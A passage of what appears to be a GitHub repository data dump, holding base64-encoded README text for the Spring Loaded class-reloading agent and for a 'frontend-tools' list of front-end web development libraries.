NS5SRUxFQVNFL3NwcmluZ2xvYWRlZC0xLjIuNS5SRUxFQVNFLmphcikKCjEu
Mi42IHNuYXBzaG90cyBhcmUgaW4gdGhpcyByZXBvIGFyZWEgKGdyYWIgdGhl
IG1vc3QgcmVjZW50bHkgYnVpbHQgLmphcik6CjxhIGhyZWY9Imh0dHBzOi8v
cmVwby5zcHJpbmcuaW8vd2ViYXBwLyMvYXJ0aWZhY3RzL2Jyb3dzZS90cmVl
L0dlbmVyYWwvbGlicy1zbmFwc2hvdC1sb2NhbC9vcmcvc3ByaW5nZnJhbWV3
b3JrL3NwcmluZ2xvYWRlZC8xLjIuNi5CVUlMRC1TTkFQU0hPVCI+cmVwby5z
cHJpbmcuaW88L2E+CgpUaGUgZG93bmxvYWQgaXMgdGhlIGFnZW50IGphciBh
bmQgbmVlZHMgbm8gZnVydGhlciB1bnBhY2tpbmcgYmVmb3JlIHVzZS4KCgoj
IFJ1bm5pbmcgd2l0aCByZWxvYWRpbmcKCglqYXZhIC1qYXZhYWdlbnQ6PHBh
dGhUbz4vc3ByaW5nbG9hZGVkLXtWRVJTSU9OfS5qYXIgLW5vdmVyaWZ5IFNv
bWVKYXZhQ2xhc3MKClRoZSB2ZXJpZmllciBpcyBiZWluZyB0dXJuZWQgb2Zm
IGJlY2F1c2Ugc29tZSBvZiB0aGUgYnl0ZWNvZGUgcmV3cml0aW5nIHN0cmV0
Y2hlcyB0aGUgbWVhbmluZyBvZgpzb21lIG9mIHRoZSBieXRlY29kZXMgLSBp
biB3YXlzIHRoZSBKVk0gZG9lc24ndCBtaW5kIGJ1dCB0aGUgdmVyaWZpZXIg
ZG9lc24ndCBsaWtlLiAgT25jZSB1cCBhbmQKcnVubmluZyB3aGF0IGVmZmVj
dGl2ZWx5IGhhcHBlbnMgaXMgdGhhdCBhbnkgY2xhc3NlcyBsb2FkZWQgZnJv
bSBqYXIgZmlsZXMgKGRlcGVuZGVuY2llcykgYXJlIG5vdAp0cmVhdGVkIGFz
IHJlbG9hZGFibGUsIHdoaWxzdCBhbnl0aGluZyBsb2FkZWQgZnJvbSAuY2xh
c3MgZmlsZXMgb24gZGlzayBpcyBtYWRlIHJlbG9hZGFibGUuIE9uY2UKbG9h
ZGVkIHRoZSAuY2xhc3MgZmlsZSB3aWxsIGJlIHdhdGNoZWQgKG9uY2UgYSBz
ZWNvbmQpIGFuZCBzaG91bGQgYSBuZXcgdmVyc2lvbiBhcHBlYXIKU3ByaW5n
TG9hZGVkIHdpbGwgcGljayBpdCB1cC4gQW55IGxpdmUgaW5zdGFuY2VzIG9m
IHRoYXQgY2xhc3Mgd2lsbCBpbW1lZGlhdGVseSBzZWUgdGhlIG5ldyBmb3Jt
Cm9mIHRoZSBvYmplY3QsIHRoZSBpbnN0YW5jZXMgZG8gbm90IG5lZWQgdG8g
YmUgZGlzY2FyZGVkIGFuZCByZWNyZWF0ZWQuCgpObyBkb3VidCB0aGF0IHJh
aXNlcyBhIGxvdCBvZiBxdWVzdGlvbnMgYW5kIGhvcGVmdWxseSBhIHByb3Bl
ciBGQVEgd2lsbCBhcHBlYXIgaGVyZSBzaG9ydGx5ISBCdXQgaW4KdGhlIG1l
YW50aW1lLCBoZXJlIGFyZSBzb21lIGJhc2ljIFFzIGFuZCBBczoKClEuIERv
ZXMgaXQgcmVsb2FkIGFueXRoaW5nIHRoYXQgbWlnaHQgY2hhbmdlIGluIGEg
Y2xhc3MgZmlsZT8KQS4gTm8sIHlvdSBjYW4ndCBjaGFuZ2UgdGhlIGhpZXJh
cmNoeSBvZiBhIHR5cGUuIEFsc28gdGhlcmUgYXJlIGNlcnRhaW4gY29uc3Ry
dWN0b3IgcGF0dGVybnMgb2YKdXNhZ2UgaXQgY2FuJ3QgYWN0dWFsbHkgaGFu
ZGxlIHJpZ2h0IG5vdy4KClEuIFdpdGggb2JqZWN0cyBjaGFuZ2luZyBzaGFw
ZSwgd2hhdCBoYXBwZW5zIHdpdGggcmVzcGVjdCB0byByZWZsZWN0aW9uPwpB
LiBSZWZsZWN0aW9uIHJlc3VsdHMgY2hhbmdlIG92ZXIgdGltZSBhcyB0aGUg
b2JqZWN0cyBhcmUgcmVsb2FkZWQuICBGb3IgZXhhbXBsZSwgbW9kaWZ5aW5n
IGEgY2xhc3MKd2l0aCBhIG5ldyBtZXRob2QgYW5kIGNhbGxpbmcgYGdldERl
Y2xhcmVkTWV0aG9kcygpYCBhZnRlciByZWxvYWRpbmcgaGFzIG9jY3VycmVk
IHdpbGwgbWVhbiB5b3Ugc2VlCnRoZSBuZXcgbWV0aG9kIGluIHRoZSByZXN1
bHRzLiAqQnV0KiB0aGlzIGRvZXMgbWVhbiBpZiB5b3UgaGF2ZSBleGlzdGlu
ZyBjYWNoZXMgaW4geW91ciBzeXN0ZW0KdGhhdCBzdGFzaCByZWZsZWN0aXZl
IGluZm9ybWF0aW9uIGFzc3VtaW5nIGl0IG5ldmVyIGNoYW5nZXMsIHRob3Nl
IHdpbGwgbmVlZCB0byBiZSBjbGVhcmVkCmFmdGVyIGEgcmVsb2FkLgoKUS4g
SG93IGRvIEkga25vdyB3aGVuIGEgcmVsb2FkIGhhcyBvY2N1cnJlZCBzbyBJ
IGNhbiBjbGVhciBteSBzdGF0ZT8KQS4gWW91IGNhbiB3cml0ZSBhIHBsdWdp
biB0aGF0IGlzIGNhbGxlZCB3aGVuIHJlbG9hZHMgb2NjdXIgYW5kIHlvdSBj
YW4gdGhlbiB0YWtlIHRoZSBhcHByb3ByaWF0ZQphY3Rpb24uICBDcmVhdGUg
YW4gaW1wbGVtZW50YXRpb24gb2YgYFJlbG9hZEV2ZW50UHJvY2Vzc29yUGx1
Z2luYCBhbmQgdGhlbiByZWdpc3RlciBpdCB2aWEKYFNwcmluZ0xvYWRlZFBy
ZVByb2Nlc3Nvci5yZWdpc3Rlckdsb2JhbFBsdWdpbihwbHVnaW4pYC4gKFRo
ZXJlIGFyZSBvdGhlciB3YXlzIHRvIHJlZ2lzdGVyIHBsdWdpbnMsCndoaWNo
IHdpbGwgaG9wZWZ1bGx5IGdldCBzb21lIGRvY3VtZW50YXRpb24hKQoKUS4g
V2hhdCdzIHRoZSBzdGF0ZSBvZiB0aGUgY29kZWJhc2U/CkEuIFRoZSB0ZWNo
bm9sb2d5IGlzIHN1Y2Nlc3NmdWxseSBiZWluZyB1c2VkIGJ5IEdyYWlscyBm
b3IgcmVsb2FkaW5nLiBJdCBkb2VzIG5lZWQgc29tZSBwZXJmb3JtYW5jZQp3
b3JrIGFuZCBhIGZldyBzbWFja3Mgd2l0aCBhIHJlZmFjdG9yaW5nIGhhbW1l
ci4gSXQgbmVlZHMgdXBncmFkaW5nIGhlcmUgYW5kIHRoZXJlIHRvIHRvbGVy
YXRlCnRoZSBpbnZva2VkeW5hbWljIGluc3RydWN0aW9uIGFuZCBhc3NvY2lh
dGVkIG5ldyBjb25zdGFudCBwb29sIGVudHJpZXMgdGhhdCBhcnJpdmVkIGlu
IEphdmEgNy4KCiMgV29ya2luZyB3aXRoIHRoZSBjb2RlCgoJZ2l0IGNsb25l
IGh0dHBzOi8vZ2l0aHViLmNvbS9zcHJpbmctcHJvamVjdHMvc3ByaW5nLWxv
YWRlZAoKT25jZSBjbG9uZWQgdGhlcmUgd2lsbCBiZSBzb21lIHByb2plY3Rz
IHN1aXRhYmxlIGZvciBpbXBvcnQgaW50byBlY2xpcHNlLiBUaGUgbWFpbiBw
cm9qZWN0IGFuZApzb21lIHRlc3QgcHJvamVjdHMuIE9uZSBvZiB0aGUgdGVz
dCBwcm9qZWN0cyBpcyBhbiBBc3BlY3RKIHByb2plY3QgKGNvbnRhaW5pbmcg
Ym90aCBKYXZhCmFuZCBBc3BlY3RKIGNvZGUpLCBhbmQgb25lIGlzIGEgR3Jv
b3Z5IHByb2plY3QuIFRvIGNvbXBpbGUgdGhlc2UgdGVzdCBwcm9qZWN0cwpp
biBFY2xpcHNlIHlvdSB3aWxsIG5lZWQgdGhlIHJlbGV2YW50IGVjbGlwc2Ug
cGx1Z2luczoKCkFKRFQ6IHVwZGF0ZSBzaXRlOiBgaHR0cHM6Ly9kb3dubG9h
ZC5lY2xpcHNlLm9yZy90b29scy9hamR0LzQyL2Rldi91cGRhdGVgCkdyb292
eS1FY2xpcHNlOiB1cGRhdGUgc2l0ZTogYGh0dHBzOi8vZGlzdC5zcHJpbmdz
b3VyY2Uub3JnL3NuYXBzaG90L0dSRUNMSVBTRS9lNC4yL2AKCkFmdGVyIGlt
cG9ydGluZyB0aGVtIHlvdSBjYW4gcnVuIHRoZSB0ZXN0cy4gIFRoZXJlIGFy
ZSB0d28ga2luZHMgb2YgdGVzdHMsIGhhbmQgY3JhZnRlZCBhbmQKZ2VuZXJh
dGVkLiAgUnVubmluZyBhbGwgdGhlIHRlc3RzIGluY2x1ZGluZyB0aGUgZ2Vu
ZXJhdGVkIG9uZXMgY2FuIHRha2UgYSB3aGlsZS4KVG8gcnVuIGp1c3QgdGhl
IGhhbmQgY3JhZnRlZCBvbmVzIHN1cHBseSB0aGlzIHRvIHRoZSBKVk0gd2hl
biBsYXVuY2hpbmcgdGhlIHRlc3RzOgoKICAgIC1Ec3ByaW5nbG9hZGVkLnRl
c3RzLmdlbmVyYXRlZFRlc3RzPWZhbHNlCgpOT1RFOiBXaGVuIHJ1bm5pbmcg
dGhlIHRlc3RzIHlvdSBuZWVkIHRvIHBhc3MgYC1ub3ZlcmlmeWAgdG8gdGhl
IEpWTSBhbHNvLgoKVHdvIGxhdW5jaCBjb25maWd1cmF0aW9ucyBhcmUgYWxy
ZWFkeSBpbmNsdWRlZCBpZiB5b3UgYXJlIGltcG9ydGluZyB0aGVzZSBwcm9q
ZWN0cyBpbnRvIGVjbGlwc2UsCndoaWNoIHJ1biB3aXRoIG9yIHdpdGhvdXQg
dGhlIGdlbmVyYXRlZCB0ZXN0cy4KCkEgZ3JhZGxlIGJ1aWxkIHNjcmlwdCBp
cyBpbmNsdWRlZCwgcnVuICcuL2dyYWRsZXcgYnVpbGQnIHRvIHJlYnVpbGQg
dGhlIGFnZW50IC0gaXQgd2lsbCBiZSBjcmVhdGVkCmFzIHNvbWV0aGluZyBs
aWtlOiBgc3ByaW5nbG9hZGVkL2J1aWxkL2xpYnMvc3ByaW5nbG9hZGVkLTEu
MS41LkJVSUxELVNOQVBTSE9ULmphcmAKCiMgQ2FuIEkgY29udHJpYnV0ZT8K
ClN1cmUhIEp1c3QgcHJlc3MgKkZvcmsqIGF0IHRoZSB0b3Agb2YgdGhpcyBn
aXRodWIgcGFnZSBhbmQgZ2V0IGNvZGluZy4gQmVmb3JlIHdlIGFjY2VwdCBw
dWxsCnJlcXVlc3RzIHdlIGp1c3QgbmVlZCB5b3UgdG8gc2lnbiBhIHNpbXBs
ZSBjb250cmlidXRvcidzIGFncmVlbWVudCAtIHdoaWNoIHlvdSBjYW4gZmlu
ZApbaGVyZV0oaHR0cHM6Ly9zdXBwb3J0LnNwcmluZ3NvdXJjZS5jb20vc3By
aW5nX2NvbW1pdHRlcl9zaWdudXApLiBTaWduaW5nIHRoZSBjb250cmlidXRv
cidzCmFncmVlbWVudCBkb2VzIG5vdCBncmFudCBhbnlvbmUgY29tbWl0IHJp
Z2h0cyB0byB0aGUgbWFpbiByZXBvc2l0b3J5LCBidXQgaXQgZG9lcyBtZWFu
IHRoYXQgd2UKY2FuIGFjY2VwdCB5b3VyIGNvbnRyaWJ1dGlvbnMsIGFuZCB5
b3Ugd2lsbCBnZXQgYW4gYXV0aG9yIGNyZWRpdCBpZiB3ZSBkby4gQWN0aXZl
IGNvbnRyaWJ1dG9ycwptaWdodCBiZSBhc2tlZCB0byBqb2luIHRoZSBjb3Jl
IHRlYW0sIGFuZCBnaXZlbiB0aGUgYWJpbGl0eSB0byBtZXJnZSBwdWxsIHJl
cXVlc3RzLgo=
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'frontend-tools',6002602,b'Landscaping With Front-end Tools',,15,2386,,2386,False,b'https://api.github.com/repos/codylindley/frontend-tools/forks',"CgoKCioqKgoKIyMgVEhJUyBJUyBERVBSRUlDQVRFRCBDT05URU5UCiMgVGhp
cyBjb250ZW50IGhhcyBldm9sdmVkIGludG8gYSBib29rIGNhbGxlZCAiRnJv
bnQtZW5kIEhhbmRib29rIjogaHR0cHM6Ly93d3cuZ2l0Ym9vay5jb20vYm9v
ay9mcm9udGVuZG1hc3RlcnMvZnJvbnQtZW5kLWhhbmRib29rL2RldGFpbHMK
CioqKgoKCgoKCgoKCgoKI0xhbmRzY2FwaW5nIFdpdGggRnJvbnRlbmQgRGV2
ZWxvcG1lbnQgVG9vbHMKCgpBbiBvcGluaW9uYXRlZCBsaXN0IG9mIHRvb2xz
IGZvciBmcm9udGVuZCAoaS5lLiBodG1sLCBqcywgY3NzKSBkZXNrdG9wL2xh
cHRvcCAoaS5lLiBkb2VzIG5vdCBpbmNsdWRlIHRhYmxldCBvciBwaG9uZSB5
ZXQpIHdlYiBkZXZlbG9wbWVudAoKCiMjQ29kaW5nIFRvb2xzCgoKIyMjIyMj
V29ya2Zsb3cvQnVpbGRzL0Fzc2VtYmxlcnMvVGFzay1ydW5uZXJzL0RldiBP
cHRzCgoqIFtidWRdKGh0dHA6Ly9naXRodWIuY29tL2F6ZXIvYnVkKQoqIFts
dW1iYXJdKGh0dHA6Ly93YWxtYXJ0bGFicy5naXRodWIuaW8vbHVtYmFyLykK
KiBbYnJ1bmNoXShodHRwOi8vYnJ1bmNoLmlvLykKKiBbZ3J1bnRdKGh0dHA6
Ly9ncnVudGpzLmNvbS8pCgkqIFtsaW5lbWFuXShodHRwczovL2dpdGh1Yi5j
b20vdGVzdGRvdWJsZS9saW5lbWFuKQoJKiBbeWVvbWFuXShodHRwOi8veWVv
bWFuLmlvLykKCSogW1Rha2VvZmZdKGh0dHA6Ly90c3ZlbnNlbi5naXRodWIu
aW8vVGFrZW9mZi8pCiogW2d1bHBqc10oaHR0cDovL2d1bHBqcy5jb20vKQoq
IFticm9jY29saV0oaHR0cHM6Ly9naXRodWIuY29tL2pvbGlzcy9icm9jY29s
aSkKKiBbbWltb3NhXShodHRwOi8vbWltb3NhLmlvLykKKiBbY29kZUtpdF0o
aHR0cDovL2luY2lkZW50NTcuY29tL2NvZGVraXQvKQoqIFtsaXZlUmVsb2Fk
XShodHRwOi8vbGl2ZXJlbG9hZC5jb20vKQoqIFtzdGVhbEpTXShodHRwOi8v
amF2YXNjcmlwdG12Yy5jb20vZG9jcy5odG1sIyFzdGVhbGpzKQoqIFthbnZp
bC5qc10oaHR0cHM6Ly9naXRodWIuY29tL2FudmlsanMvYW52aWwuanMvKQoq
IFttb2Rqc10oaHR0cDovL21vZHVsZWpzLmdpdGh1Yi5pby9tb2Rqcy8pCiog
W25vZGVmcm9udF0oaHR0cDovL2thcnRoaWt2LmdpdGh1Yi5jb20vbm9kZWZy
b250LykKKiBbQVVUT01BVE9OXShodHRwOi8vaW5kaWdvdW5pdGVkLmNvbS9h
dXRvbWF0b24vKQoqIFt2b2xvXShodHRwOi8vdm9sb2pzLm9yZy8pCiogW3Jv
b3RzXShodHRwOi8vcm9vdHMuY3gvKQoqIFttaWRkbGVtYW5dKGh0dHA6Ly9t
aWRkbGVtYW5hcHAuY29tLykKKiBbZmItZmxvXShodHRwOi8vZmFjZWJvb2su
Z2l0aHViLmlvL2ZiLWZsby8pCgotLS0KCiMjIyMjI0Jyb3dzZXIgUGFja2Fn
ZSBNYW5hZ2VycyAoY2hlY2tvdXQ6IFtGcm9udC1FbmQgUGFja2FnZSBNYW5h
Z2VyIENvbXBhcmlzb25dKGh0dHBzOi8vZ2l0aHViLmNvbS93aWxtb29yZS9m
cm9udGVuZC1wYWNrYWdlcnMpKQoKKiBbYm93ZXJdKGh0dHA6Ly9ib3dlci5p
bykKKiBbY29tcG9uZW50XShodHRwczovL2dpdGh1Yi5jb20vY29tcG9uZW50
L2NvbXBvbmVudCkKKiBbZW5kZXJdKGh0dHA6Ly9lbmRlci5qaXQuc3UvKQoq
IFtqYW1dKGh0dHA6Ly9qYW1qcy5vcmcvKQoqIFt2b2xvXShodHRwOi8vdm9s
b2pzLm9yZy8pCiogW2pzcG0uaW9dKGh0dHA6Ly9qc3BtLmlvLykKCi0tLQoK
IyMjIyMjQ1NTIEJhc2UvQm9pbGVycGxhdGUKKiBbbm9ybWFsaXplLmNzc10o
aHR0cDovL25lY29sYXMuZ2l0aHViLmNvbS9ub3JtYWxpemUuY3NzLykKCi0t
LQoKIyMjIyMjQ1NTIEZyYW1ld29ya3MgKFtDb21wYXJpc29uXShodHRwOi8v
cmVzcG9uc2l2ZS52ZXJtaWxpb24uY29tL2NvbXBhcmUucGhwKSBvciBbRnJv
bnQtZW5kIENTUyBmcmFtZXdvcmtzXShodHRwOi8vdXNhYmxpY2EuZ2l0aHVi
LmNvbS9mcm9udC1lbmQtZnJhbWV3b3Jrcy9jb21wYXJlLmh0bWwpKQoKKiBb
Zm91bmRhdGlvbl0oaHR0cDovL2ZvdW5kYXRpb24uenVyYi5jb20vKQoqIFti
b290c3RyYXBdKGh0dHA6Ly90d2l0dGVyLmdpdGh1Yi5jb20vYm9vdHN0cmFw
LykKKiBbSFRNTCBLaWNrU3RhcnRdKGh0dHA6Ly93d3cuOTlsaW1lLmNvbS9l
bGVtZW50cy8pCiogW2t1YmVdKGh0dHA6Ly9pbXBlcmF2aS5jb20va3ViZS8p
CiogW3NrZWxldG9uXShodHRwOi8vd3d3LmdldHNrZWxldG9uLmNvbS8pCiog
W2Jhc2VsaW5lXShodHRwOi8vYmFzZWxpbmVjc3MuY29tLykKKiBbZ3VtYnld
KGh0dHA6Ly9ndW1ieWZyYW1ld29yay5jb20pCiogW0dyb3VuZHdvcmtdKGh0
dHA6Ly9ncm91bmR3b3JrLnNpZGVyZWVsLmNvbS8/dXJsPWhvbWUpCiogW3Rv
cGNvYXRdKGh0dHA6Ly90b3Bjb2F0LmlvLykKKiBbcHVyZWNzc10oaHR0cDov
L3B1cmVjc3MuaW8vKQoqIFt0dWt0dWtdKGh0dHA6Ly90dWt0dWsudGFwcXVv
LmNvbS8pCiogW01ldHJvIFVJIENTU10oaHR0cDovL21ldHJvdWkub3JnLnVh
LykKKiBbRmxhdCBVSSBLaXRdKGh0dHA6Ly9kZXNpZ25tb2RvLmdpdGh1Yi5p
by9GbGF0LVVJLykKKiBbd29ya2xlc3NdKGh0dHA6Ly93b3JrbGVzcy5pa3Jl
YXRpdi5jb20vKQoqIFs5OWxpbWVdKGh0dHA6Ly93d3cuOTlsaW1lLmNvbS8p
CiogW2lua10oaHR0cDovL2luay5zYXBvLnB0LykKKiBbU2VtYW50aWMgVUld
KGh0dHA6Ly9zZW1hbnRpYy11aS5jb20vKQoqIFt1aWtpdF0oaHR0cDovL3d3
dy5nZXR1aWtpdC5jb20pCiogW2Nhc2NhZGUtZnJhbWV3b3JrXShodHRwOi8v
d3d3LmNhc2NhZGUtZnJhbWV3b3JrLmNvbS8pCiogW21pbmZ3a10oaHR0cDov
L21pbmZ3ay5jb20vKQoqIFtsYXllcnNdKGh0dHA6Ly9laXNraXMubmV0L2xh
eWVycy8pCgotLS0KCiMjIyMjI0hUTUwgQmFzZS9Cb2lsZXJwbGF0ZQoKKiBb
SFRNTDUgQm9pbGVycGxhdGVdKGh0dHA6Ly9odG1sNWJvaWxlcnBsYXRlLmNv
bS8pCiogW1JvY2sgSGFtbWVyXShodHRwOi8vc3R1ZmZhbmRub25zZW5zZS5j
by51ay9wcm9qZWN0cy9yb2NrLWhhbW1lci8pCiogW2h0bWw1Ym9uZXNdKGh0
dHA6Ly9odG1sNWJvbmVzLmNvbS8pCiogW2RDb2Rlc10oaHR0cDovL3d3dy5k
Y29kZXMubmV0LzIvZG9jcy9pbmRleC5odG1sKQoKLS0tCgojIyMjIyNGcm9u
dGVuZCBIVE1ML0NTUy9KUyBCYXNlL0JvaWxlcnBsYXRlCgoqIFtIZWFkc3Rh
cnRdKGh0dHA6Ly93d3cuaGVhZHN0YXJ0LmlvLykKKiBbZ29vZ2xlIFdlYiBT
dGFydGVyIEtpdF0oaHR0cHM6Ly9kZXZlbG9wZXJzLmdvb2dsZS5jb20vd2Vi
L3N0YXJ0ZXIta2l0LykKCi0tLQoKIyMjIyMjRE9NIFNjcmlwdGluZyAoRllJ
IGRvam8sIHl1aSwgZXh0LCBxb294ZG9vIGFsbCBoYXZlIERPTSB0b29scykK
KiBbalF1ZXJ5XShodHRwOi8vanF1ZXJ5LmNvbS8pCgkqICBbalF1ZXJ5Kytd
KGh0dHA6Ly9qcXVlcnlwcC5jb20vKQoqIFt6ZXB0b10oaHR0cDovL3plcHRv
anMuY29tLykKKiBbdGlyZV0oaHR0cDovL3RpcmVqcy5jb20vKQoqIFttb29U
b29sc10oaHR0cDovL21vb3Rvb2xzLm5ldC8pCiogW0RPTUFzc2lzdGFudF0o
aHR0cDovL3d3dy5kb21hc3Npc3RhbnQuY29tLykKKiBbRW5kZXJzIFRoZSBK
ZWVzaF0oaHR0cHM6Ly9naXRodWIuY29tL2VuZGVyLWpzL2plZXNoKQogCSog
W2RvbVJlYWR5XShodHRwczovL2dpdGh1Yi5jb20vZGVkL2RvbXJlYWR5KQog
CSogW3F1ZXJ5XShodHRwczovL2dpdGh1Yi5jb20vZGVkL3F3ZXJ5KQoJKiBb
Ym9uem9dKGh0dHBzOi8vZ2l0aHViLmNvbS9kZWQvYm9uem8pCgkqIFtiZWFu
XShodHRwczovL2dpdGh1Yi5jb20vZmF0L2JlYW4pCiogW3J5ZV0oaHR0cDov
L3J5ZWpzLmNvbS8pCiogW2RvbV0oaHR0cHM6Ly9naXRodWIuY29tL2NvbXBv
bmVudC9kb20pCgotLS0KCiMjIyMjI0pTIEhlbHBlcnMKKiBbbG8tZGFzaF0o
aHR0cDovL2xvZGFzaC5jb20vKQoqIFtmbi5qc10oaHR0cDovL2VsaXBlcmVs
bWFuLmNvbS9mbi5qcy8pCiogW2xhenkuanNdKGh0dHA6Ly9kYW5pZWx0YW8u
Y29tL2xhenkuanMvKQoqIFtzdHJpbmcuanNdKGh0dHA6Ly9zdHJpbmdqcy5j
b20vKQoqIFtib2lsZXIuanNdKGh0dHA6Ly93d3cuYm9pbGVyanMuY29tLykK
KiBbdW5kZXJzY29yZV0oaHR0cDovL3VuZGVyc2NvcmVqcy5vcmcvKQoJKiBb
dW5kZXJzY29yZS5zdHJpbmddKGh0dHA6Ly9lcGVsaS5naXRodWIuaW8vdW5k
ZXJzY29yZS5zdHJpbmcvKQoqIFtzdWdhci5qc10oaHR0cDovL3N1Z2FyanMu
Y29tLykKKiBbY3JhZnQuanNdKGh0dHA6Ly9jcmFmdGpzLm9yZy8pCiogW3Zh
bGVudGluZV0oaHR0cHM6Ly9naXRodWIuY29tL2RlZC92YWxlbnRpbmUpCiog
W3BsYXRmb3JtLmpzXShodHRwczovL2dpdGh1Yi5jb20vYmVzdGllanMvcGxh
dGZvcm0uanMpCiogW21vZGVybml6cl0oaHR0cDovL21vZGVybml6ci5jb20v
KQoJKiBbeWVwbm9wZV0oaHR0cDovL3llcG5vcGVqcy5jb20vKQoqIFtKU09O
M10oaHR0cDovL2Jlc3RpZWpzLmdpdGh1Yi5pby9qc29uMy8pCiogW3VyaS5q
c10oaHR0cHM6Ly9naXRodWIuY29tL21lZGlhbGl6ZS9VUkkuanMpCiogW21v
bWVudC5qc10oaHR0cDovL21vbWVudGpzLmNvbS8pCiogW3dhaXQuanNdKGh0
dHBzOi8vZ2l0aHViLmNvbS9lbHZpbmcvd2FpdCkKKiBbTnVtZXJhbC5qc10o
aHR0cDovL251bWVyYWxqcy5jb20vKQoqIFthY2NvdW50aW5nLmpzXShodHRw
Oi8vam9zc2Nyb3djcm9mdC5naXRodWIuaW8vYWNjb3VudGluZy5qcy8pCiog
W1VwY2FzdF0oaHR0cHM6Ly9naXRodWIuY29tL3Jvd2FubWFubmluZy91cGNh
c3QpCiogW3RhZmZ5ZGJdKGh0dHA6Ly93d3cudGFmZnlkYi5jb20vKQoqIFtD
YXRpbGluZS5qc10oaHR0cDovL0NhdGlsaW5lanMuY29tLykKKiBbWFJlZ0V4
cF0oaHR0cDovL3hyZWdleHAuY29tLykKKiBbZHVja3lqc10oaHR0cDovL2R1
Y2t5anMuY29tLykKKiBbbWF0aGpzXShodHRwOi8vbWF0aGpzLm9yZy8pCiog
W3NwZWN0cmEuanNdKGh0dHA6Ly9hYWtwYXQ2LmdpdGh1Yi5pby9zcGVjdHJh
LykKCi0tLQoKIyMjIyMjS2V5Ym9hcmQgSGVscGVycwoqIFtrZXlzLmpzXSho
dHRwczovL2dpdGh1Yi5jb20vYml0d2Fsa2VyL2tleXMuanMpCiogW21vdXNl
c3RyYXBdKGh0dHA6Ly9jcmFpZy5pcy9raWxsaW5nL21pY2UpCiogW0tleXBy
ZXNzXShodHRwOi8vZG1hdXJvLmdpdGh1Yi5pby9LZXlwcmVzcy8pCgotLS0K
CiMjIyMjI0V2ZW50IChtb3VzZS90b3VjaC9wb2ludGVyKSBIZWxwZXJzCiog
W3BvaW50ZXIuanNdKGh0dHBzOi8vZ2l0aHViLmNvbS9tb3ppbGxhL3BvaW50
ZXIuanMpCiogW3RodW1icy5qc10oaHR0cDovL213YnJvb2tzLmdpdGh1Yi5p
by90aHVtYnMuanMvKQoqIFtIYW1tZXIuanNdKGh0dHBzOi8vZ2l0aHViLmNv
bS9FaWdodE1lZGlhL2hhbW1lci5qcykKKiBbRXZlbnQuanNdKGh0dHBzOi8v
Z2l0aHViLmNvbS9tdWRjdWJlL0V2ZW50LmpzKQoqIFtEZWVwVGlzc3VlLmpz
XShodHRwOi8vZGVlcHRpc3N1ZWpzLmNvbSkKCi0tLQoKIyMjIyMjQ1NTIEhl
bHBlcnMKKiBbdHlwZWNzc2V0XShodHRwczovL2dpdGh1Yi5jb20vY3Nzd2l6
YXJkcnkvdHlwZWNzc2V0KQoqIFstcHJlZml4LWZyZWVdKGh0dHA6Ly9sZWF2
ZXJvdS5naXRodWIuaW8vcHJlZml4ZnJlZS8pCiogW0NTU2NvbWJdKGh0dHA6
Ly9jc3Njb21iLmNvbSkKKiBbQXV0b3ByZWZpeGVyXShodHRwczovL2dpdGh1
Yi5jb20vYWkvYXV0b3ByZWZpeGVyKQoKLS0tCgojIyMjIyNNb2R1bGUvU2Ny
aXB0IERlcGVuZGVuY3kgTG9hZGVycyAoW0phdmFzY3JpcHQgTG9hZGVycyBD
b21wYXJpc29uXShodHRwczovL3NwcmVhZHNoZWV0cy5nb29nbGUuY29tL3Nw
cmVhZHNoZWV0L2x2P2tleT0wQXFsbjJha1BXaU1JZEVSa1kzSjJPWGRPVVZK
RFRrTlNRMlpzVjNob1dWRSZmPXRydWUmbm9oZWFkZXI9dHJ1ZSZnaWQ9Mikp
CiogW3JlcXVpcmUuanNdKGh0dHA6Ly9yZXF1aXJlanMub3JnLykKCSogW2Fs
bW9uZF0oaHR0cHM6Ly9naXRodWIuY29tL2pyYnVya2UvYWxtb25kKQoqIFtj
YWpvbl0oaHR0cHM6Ly9naXRodWIuY29tL3JlcXVpcmVqcy9jYWpvbikKKiBb
YnJvd3NlcmlmeV0oaHR0cHM6Ly9naXRodWIuY29tL3N1YnN0YWNrL25vZGUt
YnJvd3NlcmlmeSkKKiBbY3VybF0oaHR0cHM6Ly9naXRodWIuY29tL2N1am9q
cy9jdXJsKQoqIFtzaGVwaGVyZC1qc10oaHR0cDovL3hjYW1iYXIuZ2l0aHVi
LmlvL3NoZXBoZXJkLWpzLykKKiBbVU1EIChVbml2ZXJzYWwgTW9kdWxlIERl
ZmluaXRpb24pXShodHRwczovL2dpdGh1Yi5jb20vdW1kanMvdW1kKQoJKiBb
VU1ELWluc3BpcmVkIE1vZHVsZSBCb2lsZXJwbGF0ZV0oaHR0cHM6Ly9naXN0
LmdpdGh1Yi5jb20vMzg4MDQxNSkKKiBbSW5qZWN0XShodHRwczovL2dpdGh1
Yi5jb20vbGlua2VkaW4vaW5qZWN0KQoqIFtjb250cm9sSlNdKGh0dHA6Ly9j
b250cm9sanMub3JnLykKKiBbSkFMXShodHRwczovL2dpdGh1Yi5jb20vdGFp
bC1mLXN5c3RlbXMvSkFMKQoqIFt5ZXBub3BlXShodHRwOi8veWVwbm9wZWpz
LmNvbS8pCiogW0FYRUxdKGh0dHBzOi8vZ2l0aHViLmNvbS9hbW9sLS9heGVs
KQoqIFtsbWRdKGh0dHA6Ly9sbWRqcy5vcmcvKQoqIFtMYXp5SlNdKGh0dHA6
Ly9iZXZhY3F1YS5naXRodWIuaW8vbGF6eWpzLykKKiBbanNwbS5pb10oaHR0
cDovL2pzcG0uaW8vKQoqIFtsYXp5LmpzXShodHRwczovL2dpdGh1Yi5jb20v
bWVyY2Fkb2xpYnJlL2xhenkuanMpCiogW3dlYnBhY2tdKGh0dHBzOi8vZ2l0
aHViLmNvbS93ZWJwYWNrL3dlYnBhY2spCiogW3N5c3RlbWpzXShodHRwczov
L2dpdGh1Yi5jb20vc3lzdGVtanMvc3lzdGVtanMpCgotLS0KCiMjIyMjI1Rl
bXBsYXRlcyAoW3RlbXBsYXRlIGNob29zZXJdKGh0dHA6Ly9nYXJhbm4uZ2l0
